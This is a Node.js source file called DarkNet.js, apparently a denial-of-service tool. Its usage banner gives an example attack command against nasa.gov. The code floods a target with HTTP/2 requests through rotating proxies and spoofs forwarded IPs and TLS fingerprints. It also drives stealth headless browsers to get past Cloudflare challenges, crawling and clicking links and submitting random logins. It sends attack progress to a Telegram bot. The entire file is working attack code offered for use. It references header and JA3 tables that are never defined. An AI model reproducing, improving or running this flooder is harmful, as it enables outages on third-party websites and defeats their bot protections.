/*
    by Dark JPT Team DarkNet JPT
    Enhanced version with improved CAPTCHA bypassing, JA3 spoofing, and adaptive strategies
    USAGE:
    node DarkNet.js <target> <time> <rps> <thread> <proxyfile> [proxytype] [bots_per_thread] [use_playwright] [use_stealth] [crawl_depth] [raw_ratio] [block_threshold]

    NEW PARAMETERS:
    - [block_threshold] → Max blocks before switching to raw flood (default: 10)

    EXAMPLE COMMAND:
    node DarkNet.js https://nasa.gov 120 32 32 proxy.txt socks5 10 false true 3 0.8 10
*/

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fakeua = require('fake-useragent');
const fs = require("fs");
const puppeteer = require('puppeteer-extra');
const { Cluster } = require('puppeteer-cluster');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const AnonymizeUA = require('puppeteer-extra-plugin-anonymize-ua');
const { SocksProxyAgent } = require('socks-proxy-agent');
const fetch = require('node-fetch');
const playwright = require('playwright');

puppeteer.use(StealthPlugin());
puppeteer.use(AnonymizeUA());

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

let headers = {};
let proxies = [];
let proxyScores = new Map();
let cooldownProxies = new Map();
let proxyTestQueue = 0;
const MAX_PROXY_TESTS = 5; // Limit concurrent proxy tests
const stats = {
    requests: 0,
    blocks: 0,
    bypassAttempts: 0,
    threadsActive: 0,
    botsActive: 0,
    startTime: Date.now(),
    consecutiveBlocks: 0
};

function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.error(`Error: Proxy file ${filePath} does not exist`);
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    if (lines.length === 0) {
        console.error(`Error: Proxy file ${filePath} is empty`);
        process.exit(1);
    }
    return lines.filter(line => line.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$/));
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
    proxyType: process.argv[7] || 'http',
    botsPerThread: parseInt(process.argv[8]) || 5,
    usePlaywright: process.argv[9] === 'true',
    useStealth: process.argv[10] === 'true',
    crawlDepth: parseInt(process.argv[11]) || 2,
    rawRatio: parseFloat(process.argv[12]) || 0.7,
    blockThreshold: parseInt(process.argv[13]) || 10
};

// Validate inputs
if (process.argv.length < 7) {
    console.log(`
    USAGE:
    node DarkNet.js <target> <time> <rps> <thread> <proxyfile> [proxytype] [bots_per_thread] [use_playwright] [use_stealth] [crawl_depth] [raw_ratio] [block_threshold]

    EXAMPLE COMMAND:
    node DarkNet.js https://nasa.gov 120 32 32 proxy.txt socks5 10 false true 3 0.8 10
    `);
    process.exit(1);
}

if (!args.target || !args.target.startsWith('http')) {
    console.error('Error: Invalid target URL. Must start with http or https');
    process.exit(1);
}
if (isNaN(args.time) || args.time <= 0) {
    console.error('Error: Time must be a positive number');
    process.exit(1);
}
if (isNaN(args.Rate) || args.Rate <= 0) {
    console.error('Error: RPS must be a positive number');
    process.exit(1);
}
if (isNaN(args.threads) || args.threads <= 0) {
    console.error('Error: Threads must be a positive number');
    process.exit(1);
}
if (args.rawRatio < 0 || args.rawRatio > 1) {
    console.error('Error: raw_ratio must be between 0 and 1');
    process.exit(1);
}
if (isNaN(args.botsPerThread) || args.botsPerThread <= 0) {
    console.error('Error: Bots per thread must be a positive number');
    process.exit(1);
}
if (isNaN(args.crawlDepth) || args.crawlDepth < 0) {
    console.error('Error: Crawl depth must be a non-negative number');
    process.exit(1);
}
if (isNaN(args.blockThreshold) || args.blockThreshold <= 0) {
    console.error('Error: Block threshold must be a positive number');
    process.exit(1);
}

proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

// Initialize proxy scores
proxies.forEach(proxy => proxyScores.set(proxy, { score: 100, latency: 0, lastUsed: 0 }));

// Auto-fetch proxies from free proxy lists
async function fetchNewProxies() {
    const proxySources = [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all',
        'https://www.proxy-list.download/api/v1/get?type=socks5'
    ];
    for (const source of proxySources) {
        try {
            const response = await fetch(source, { timeout: 10000 });
            const newProxies = (await response.text()).split('\n').filter(p => p.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$/));
            newProxies.forEach(proxy => {
                if (!proxies.includes(proxy)) {
                    proxies.push(proxy);
                    proxyScores.set(proxy, { score: 100, latency: 0, lastUsed: 0 });
                }
            });
            console.log(`Fetched ${newProxies.length} new proxies`);
        } catch (error) {
            console.error('Error fetching proxies:', error.message);
        }
    }
}

async function sendTelegramNotification(message) {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!botToken || !chatId) return;

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message }),
            timeout: 5000
        });
    } catch (error) {
        console.error('Telegram notification error:', error.message);
    }
}

function logStats() {
    const elapsedSeconds = (Date.now() - stats.startTime) / 1000;
    const rps = elapsedSeconds > 0 ? (stats.requests / elapsedSeconds).toFixed(2) : 0;
    console.log(`[Stats] Requests: ${stats.requests} | Blocks: ${stats.blocks} | Bypass Attempts: ${stats.bypassAttempts} | RPS: ${rps} | Active Threads: ${stats.threadsActive} | Active Bots: ${stats.botsActive} | Live Proxies: ${proxies.length} | Cooldown Proxies: ${cooldownProxies.size}`);
    sendTelegramNotification(`[Stats] Requests: ${stats.requests} | Blocks: ${stats.blocks} | Bypass Attempts: ${stats.bypassAttempts} | RPS: ${rps} | Active Bots: ${stats.botsActive} | Live Proxies: ${proxies.length}`);
}

function addProxyToCooldown(proxy) {
    const cooldownTime = randomIntn(300000, 600000);
    cooldownProxies.set(proxy, Date.now() + cooldownTime);
    proxies = proxies.filter(p => p !== proxy);
    setTimeout(() => {
        if (cooldownProxies.has(proxy)) {
            proxies.push(proxy);
            cooldownProxies.delete(proxy);
            proxyScores.set(proxy, { ...proxyScores.get(proxy), score: Math.min(100, proxyScores.get(proxy).score + 10) });
            console.log(`Proxy ${proxy} restored after cooldown.`);
            logStats();
        }
    }, cooldownTime);
}

async function testProxyLatency(proxy) {
    if (proxyTestQueue >= MAX_PROXY_TESTS) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        return testProxyLatency(proxy); // Retry after delay
    }
    proxyTestQueue++;
    const [host, port] = proxy.split(':');
    return new Promise(resolve => {
        const socket = net.connect({ host, port });
        socket.unref();
        const start = Date.now();
        socket.on('connect', () => {
            socket.destroy();
            proxyTestQueue--;
            const latency = Date.now() - start;
            proxyScores.set(proxy, { ...proxyScores.get(proxy), latency, lastUsed: Date.now() });
            resolve(latency);
        });
        socket.on('error', () => {
            socket.destroy();
            proxyTestQueue--;
            proxyScores.set(proxy, { ...proxyScores.get(proxy), score: Math.max(0, proxyScores.get(proxy).score - 20) });
            resolve(Infinity);
        });
        socket.setTimeout(5000, () => {
            socket.destroy();
            proxyTestQueue--;
            resolve(Infinity);
        });
    });
}

function getBestProxy() {
    const now = Date.now();
    const validProxies = proxies.filter(p => {
        const score = proxyScores.get(p);
        return score.score > 0 && (now - score.lastUsed) > 10000;
    });
    if (validProxies.length === 0) {
        fetchNewProxies();
        return null;
    }
    return validProxies.reduce((best, curr) => {
        const currScore = proxyScores.get(curr);
        const bestScore = proxyScores.get(best);
        return currScore.score / (currScore.latency + 1) > bestScore.score / (bestScore.latency + 1) ? curr : best;
    }, validProxies[0]);
}

async function bypassCloudflare(page, proxy, retryCount = 0) {
    const maxRetries = 3;
    try {
        const isCloudflareDetected = await page.evaluate(() => {
            return document.querySelector('#cf-challenge-checkbox, [name="cf-turnstile-response"], #challenge-form, .g-recaptcha') !== null ||
                   document.title.includes('Just a moment') ||
                   document.body.innerText.includes('Checking your browser');
        });

        if (!isCloudflareDetected) {
            console.log('No Cloudflare challenge detected.');
            return true;
        }

        console.log('Cloudflare challenge detected. Attempting to bypass...');
        stats.bypassAttempts++;
        await new Promise(resolve => setTimeout(resolve, randomIntn(5000, 15000)));

        // Simulate advanced browser properties
        await page.evaluate(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => Math.floor(Math.random() * 4 + 4) });
            Object.defineProperty(navigator, 'deviceMemory', { get: () => Math.floor(Math.random() * 4 + 4) });
            window.navigator.chrome = { runtime: {} };
            Object.defineProperty(HTMLCanvasElement.prototype, 'getContext', {
                value: function(contextType) {
                    if (contextType === '2d') {
                        return {
                            getImageData: () => ({
                                data: new Uint8ClampedArray(4000).map(() => Math.random() * 255)
                            }),
                            fillRect: () => {},
                            drawImage: () => {},
                            getContextAttributes: () => ({ alpha: true, desynchronized: true })
                        };
                    }
                    return null;
                }
            });
        });

        const cfCheckbox = await page.$('#cf-challenge-checkbox');
        if (cfCheckbox) {
            await moveMouseWithBezier(page, randomIntn(0, 800), randomIntn(0, 600), randomIntn(0, 800), randomIntn(0, 600));
            await page.evaluate(() => document.querySelector('#cf-challenge-checkbox').click());
            await new Promise(resolve => setTimeout(resolve, randomIntn(3000, 8000)));
            console.log('Clicked Cloudflare checkbox.');
        }

        const jsChallenge = await page.$('#challenge-form');
        if (jsChallenge) {
            console.log('JavaScript challenge detected. Waiting for resolution...');
            await page.waitForNavigation({ timeout: 30000, waitUntil: 'networkidle2' }).catch(() => {
                console.log('JS challenge navigation timed out.');
            });
        }

        const isStillBlocked = await page.evaluate(() => document.title.includes('Just a moment') || document.body.innerText.includes('Checking your browser'));
        if (!isStillBlocked) {
            console.log('Cloudflare challenge bypassed successfully.');
            return true;
        } else if (retryCount < maxRetries) {
            console.log('Failed to bypass Cloudflare. Retrying...');
            await smartRetry(page, proxy, retryCount + 1);
            return false;
        } else {
            console.log('Max bypass retries reached. Switching to raw flooder.');
            runRawFlooder();
            return false;
        }
    } catch (error) {
        console.error('Error handling Cloudflare:', error.message);
        stats.blocks++;
        stats.consecutiveBlocks++;
        addProxyToCooldown(proxy);
        if (stats.consecutiveBlocks >= args.blockThreshold) {
            console.log('Block threshold reached. Switching to raw flooder.');
            runRawFlooder();
        } else {
            await smartRetry(page, proxy, retryCount + 1);
        }
        return false;
    }
}

if (cluster.isMaster) {
    stats.threadsActive = args.threads;
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    cluster.on('exit', (worker) => {
        console.log(`Thread ${worker.process.pid} died. Restarting...`);
        stats.threadsActive--;
        cluster.fork();
        stats.threadsActive++;
        logStats();
    });
    setInterval(logStats, 30000);
    setInterval(fetchNewProxies, 600000);
    sendTelegramNotification(`Started attack on ${args.target} with ${args.threads} threads, ${args.botsPerThread} bots per thread, raw ratio: ${args.rawRatio}, block threshold: ${args.blockThreshold}`);
} else {
    setInterval(runRawFlooder, 1000 / (args.Rate * args.rawRatio));
    launchBotCluster();
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port
        });
        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);
        connection.on("connect", () => {
            connection.write(buffer);
        });
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

async function moveMouseWithBezier(page, startX, startY, endX, endY, steps = 20) {
    const bezier = (t, p0, p1, p2, p3) => ({
        x: Math.pow(1 - t, 3) * p0.x + 3 * Math.pow(1 - t, 2) * t * p1.x + 3 * (1 - t) * t * t * p2.x + Math.pow(t, 3) * p3.x,
        y: Math.pow(1 - t, 3) * p0.y + 3 * Math.pow(1 - t, 2) * t * p1.y + 3 * (1 - t) * t * t * p2.y + Math.pow(t, 3) * p3.y
    });

    const controlPoint1 = { x: startX + randomIntn(-100, 100), y: startY + randomIntn(-100, 100) };
    const controlPoint2 = { x: endX + randomIntn(-100, 100), y: endY + randomIntn(-100, 100) };
    const points = [];
    for (let i = 0; i <= steps; i++) {
        const t = i / steps;
        points.push(bezier(t, { x: startX, y: startY }, controlPoint1, controlPoint2, { x: endX, y: endY }));
    }

    for (const point of points) {
        await page.mouse.move(point.x, point.y);
        await new Promise(resolve => setTimeout(resolve, randomIntn(20, 50)));
    }
}

async function humanLikeTyping(page, selector, text) {
    try {
        for (const char of text) {
            await page.type(selector, char, { delay: randomIntn(100, 300) });
            if (Math.random() < 0.1) await new Promise(resolve => setTimeout(resolve, randomIntn(500, 1500)));
            if (Math.random() < 0.05) {
                await page.keyboard.press('Backspace');
                await new Promise(resolve => setTimeout(resolve, randomIntn(200, 500)));
                await page.type(selector, char, { delay: randomIntn(100, 300) });
            }
        }
    } catch (error) {
        console.error(`Error in humanLikeTyping for selector ${selector}:`, error.message);
    }
}

async function launchBotCluster() {
    const browserEngine = args.usePlaywright ? playwright.chromium : puppeteer;
    let cluster;
    if (!args.usePlaywright) {
        cluster = await Cluster.launch({
            concurrency: Cluster.CONCURRENCY_BROWSER,
            maxConcurrency: args.botsPerThread,
            puppeteerOptions: {
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-infobars',
                    '--window-position=0,0',
                    '--ignore-certificate-errors',
                    '--ignore-certificate-errors-spki-list',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--disable-gpu',
                    ...(args.useStealth ? ['--enable-features=NetworkService,NetworkServiceInProcess'] : [])
                ]
            }
        });
    }

    stats.botsActive += args.botsPerThread;
    for (let i = 0; i < args.botsPerThread; i++) {
        (async () => {
            const proxy = getBestProxy();
            if (!proxy) {
                console.error('No valid proxies available. Switching to raw flooder.');
                runRawFlooder();
                return;
            }
            const [proxyHost, proxyPort] = proxy.split(':');
            let agent;
            if (args.proxyType === 'socks5' || args.proxyType === 'socks4' || args.proxyType === 'residential') {
                agent = new SocksProxyAgent(`${args.proxyType === 'residential' ? 'socks5' : args.proxyType}://${proxyHost}:${proxyPort}`);
            }

            const browserProfile = randomElement(['chrome', 'firefox']);
            let browserContext, page;
            try {
                if (args.usePlaywright) {
                    browserContext = await browserEngine.launchPersistentContext('', {
                        headless: true,
                        args: [
                            '--no-sandbox',
                            '--disable-setuid-sandbox',
                            '--disable-infobars',
                            '--ignore-certificate-errors',
                            `--proxy-server=${args.proxyType}://${proxyHost}:${proxyPort}`
                        ],
                        viewport: { width: randomIntn(1024, 1920), height: randomIntn(600, 1080) }
                    });
                    page = (await browserContext.pages())[0];
                    await page.setExtraHTTPHeaders(realHeaders[browserProfile]);
                } else {
                    page = await cluster.execute({ proxy, proxyType: args.proxyType }, async ({ page, data }) => {
                        await page.setUserAgent(realHeaders[browserProfile]['user-agent']);
                        await page.setExtraHTTPHeaders(realHeaders[browserProfile]);
                        return page;
                    });
                }

                await testProxyLatency(proxy);
                await page.goto(args.target, { waitUntil: 'networkidle2', timeout: 60000 });
                await simulateHumanBehavior(page);
                if (await bypassCloudflare(page, proxy)) {
                    const links = await crawlLinks(page, args.target, args.crawlDepth);
                    for (const link of links) {
                        await spamLink(page, link);
                    }
                    await attemptFakeLogin(page);
                }
            } catch (err) {
                console.error(`Bot ${i} error:`, err.message);
                stats.blocks++;
                stats.consecutiveBlocks++;
                proxyScores.set(proxy, { ...proxyScores.get(proxy), score: Math.max(0, proxyScores.get(proxy).score - 20) });
                addProxyToCooldown(proxy);
                if (stats.consecutiveBlocks >= args.blockThreshold) {
                    console.log('Block threshold reached. Switching to raw flooder.');
                    runRawFlooder();
                } else {
                    await smartRetry(page, proxy);
                }
            } finally {
                if (args.usePlaywright && browserContext) await browserContext.close();
                stats.botsActive--;
                logStats();
            }
        })();
    }

    if (!args.usePlaywright) {
        cluster.on('taskerror', (err, data) => {
            console.error(`Cluster task error:`, err.message);
            stats.blocks++;
            stats.consecutiveBlocks++;
            addProxyToCooldown(data.proxy);
            stats.botsActive--;
            logStats();
            if (stats.consecutiveBlocks >= args.blockThreshold) {
                console.log('Block threshold reached. Switching to raw flooder.');
                runRawFlooder();
            }
        });
    }
}

async function simulateHumanBehavior(page) {
    try {
        const scrollCount = randomIntn(3, 10);
        for (let i = 0; i < scrollCount; i++) {
            await page.evaluate(() => {
                const scrollY = Math.random() * (window.innerHeight * 2);
                window.scrollTo({ top: scrollY, behavior: 'smooth' });
            });
            await new Promise(resolve => setTimeout(resolve, randomIntn(500, 2000)));
            if (Math.random() > 0.7) await new Promise(resolve => setTimeout(resolve, randomIntn(3000, 10000)));
        }

        const banners = await page.$$('img[alt*="ad"], .banner, .ad');
        if (banners.length > 0) {
            const randomBanner = banners[randomIntn(0, banners.length)];
            await moveMouseWithBezier(page, randomIntn(0, 800), randomIntn(0, 600), randomIntn(0, 800), randomIntn(0, 600));
            await randomBanner.click({ delay: randomIntn(100, 500) });
            await new Promise(resolve => setTimeout(resolve, randomIntn(1000, 5000)));
        }

        for (let i = 0; i < randomIntn(2, 5); i++) {
            await moveMouseWithBezier(page, randomIntn(0, 800), randomIntn(0, 600), randomIntn(0, 800), randomIntn(0, 600));
            await new Promise(resolve => setTimeout(resolve, randomIntn(200, 1000)));
        }

        await page.evaluate(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => Math.floor(Math.random() * 4 + 4) });
            Object.defineProperty(navigator, 'deviceMemory', { get: () => Math.floor(Math.random() * 4 + 4) });
            window.navigator.chrome = { runtime: {} };
            Object.defineProperty(HTMLCanvasElement.prototype, 'getContext', {
                value: function(contextType) {
                    if (contextType === '2d') {
                        return {
                            getImageData: () => ({
                                data: new Uint8ClampedArray(4000).map(() => Math.random() * 255)
                            }),
                            fillRect: () => {},
                            drawImage: () => {},
                            getContextAttributes: () => ({ alpha: true, desynchronized: true })
                        };
                    }
                    return null;
                }
            });
        });
    } catch (error) {
        console.error('Error in simulateHumanBehavior:', error.message);
    }
}

async function attemptFakeLogin(page) {
    try {
        const loginForm = await page.$('form[action*="login"], input[type="password"]');
        if (loginForm) {
            await humanLikeTyping(page, 'input[name="username"], input[type="email"]', randstr(8));
            await humanLikeTyping(page, 'input[name="password"], input[type="password"]', randstr(12));
            await moveMouseWithBezier(page, randomIntn(0, 800), randomIntn(0, 600), randomIntn(0, 800), randomIntn(0, 600));
            await page.click('button[type="submit"], input[type="submit"]', { delay: randomIntn(100, 500) });
            await new Promise(resolve => setTimeout(resolve, randomIntn(2000, 5000)));
        }
    } catch (error) {
        console.error('Error in attemptFakeLogin:', error.message);
    }
}

async function smartRetry(page, oldProxy, retryCount = 0) {
    const maxRetries = 3;
    if (retryCount >= maxRetries) {
        console.log('Max retries reached. Switching to raw flooder.');
        runRawFlooder();
        return;
    }

    addProxyToCooldown(oldProxy);
    const newProxy = getBestProxy();
    if (!newProxy) {
        console.error('No proxies left. Switching to raw flooder.');
        runRawFlooder();
        return;
    }

    const browserProfile = randomElement(['chrome', 'firefox']);
    await page.setExtraHTTPHeaders(realHeaders[browserProfile]);
    await new Promise(resolve => setTimeout(resolve, randomIntn(5000, 15000)));
    await page.goto(args.target, { waitUntil: 'networkidle2', timeout: 60000 });
    await bypassCloudflare(page, newProxy, retryCount);
}

async function crawlLinks(page, baseUrl, depth) {
    if (depth <= 0) return [];
    let links = [];
    try {
        const newLinks = await page.evaluate(() => Array.from(document.querySelectorAll('a'), a => a.href).filter(href => href.startsWith('http')));
        links = [...new Set([...links, ...newLinks])].slice(0, Math.min(50, 10 * depth));

        for (const link of links.slice(0, 5)) {
            try {
                await page.goto(link, { waitUntil: 'domcontentloaded', timeout: 30000 });
                const subLinks = await crawlLinks(page, link, depth - 1);
                links = [...new Set([...links, ...subLinks])].slice(0, 50);
            } catch (error) {
                console.error(`Error crawling ${link}:`, error.message);
            }
        }
    } catch (error) {
        console.error('Error crawling links:', error.message);
    }
    return links;
}

async function spamLink(page, link) {
    try {
        await page.goto(link, { waitUntil: 'domcontentloaded', timeout: 30000 });
        const elements = await page.$$('a, button, img');
        if (elements.length > 0) {
            const randomElement = elements[randomIntn(0, elements.length)];
            await moveMouseWithBezier(page, randomIntn(0, 800), randomIntn(0, 600), randomIntn(0, 800), randomIntn(0, 600));
            await randomElement.click({ delay: randomIntn(100, 500) });
            stats.requests++;
        }
        await new Promise(resolve => setTimeout(resolve, randomIntn(50, 200)));
    } catch (error) {
        console.error(`Error spamming link ${link}:`, error.message);
        stats.blocks++;
        stats.consecutiveBlocks++;
        if (stats.consecutiveBlocks >= args.blockThreshold) {
            console.log('Block threshold reached. Switching to raw flooder.');
            runRawFlooder();
        }
    }
}

function runRawFlooder() {
    const proxy = getBestProxy();
    if (!proxy) {
        console.error('No valid proxies available.');
        return;
    }
    const parsedProxy = proxy.split(":");
    const browserProfile = randomElement(['chrome', 'firefox']);
    const ja3 = ja3Profiles[browserProfile];

    headers = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + "?" + randstr(5) + "=" + randstr(15),
        ":scheme": "https",
        "x-forwarded-proto": "https",
        "cache-control": realHeaders[browserProfile]['cache-control'] || 'no-cache',
        "X-Forwarded-For": ip_spoof(),
        ...realHeaders[browserProfile]
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 300
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            addProxyToCooldown(proxy);
            return;
        }
        connection.setKeepAlive(true, 200000);
        const tlsOptions = {
            secure: true,
            ALPNProtocols: ja3.alpn,
            ciphers: ja3.ciphers,
            socket: connection,
            ecdhCurve: 'X25519:prime256v1:secp384r1',
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: 'TLSv1_2_method'
        };
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 20000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 128000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection
        });
        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        });
        client.on("connect", () => {
            const interval = setInterval(() => {
                const burstSize = randomIntn(args.Rate, args.Rate * 2);
                for (let i = 0; i < burstSize; i++) {
                    const request = client.request(headers);
                    stats.requests++;
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 1000);
            client.on("close", () => clearInterval(interval));
        });
        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
        client.on("error", () => {
            client.destroy();
            connection.destroy();
            addProxyToCooldown(proxy);
        });
    });
}

const KillScript = () => {
    const elapsedSeconds = (Date.now() - stats.startTime) / 1000;
    const rps = elapsedSeconds > 0 ? (stats.requests / elapsedSeconds).toFixed(2) : 0;
    sendTelegramNotification(`Attack on ${args.target} completed. Final Stats: Requests: ${stats.requests}, Blocks: ${stats.blocks}, Bypass Attempts: ${stats.bypassAttempts}, RPS: ${rps}, Live Proxies: ${proxies.length}`);
    process.exit(1);
};
setTimeout(KillScript, args.time * 1000);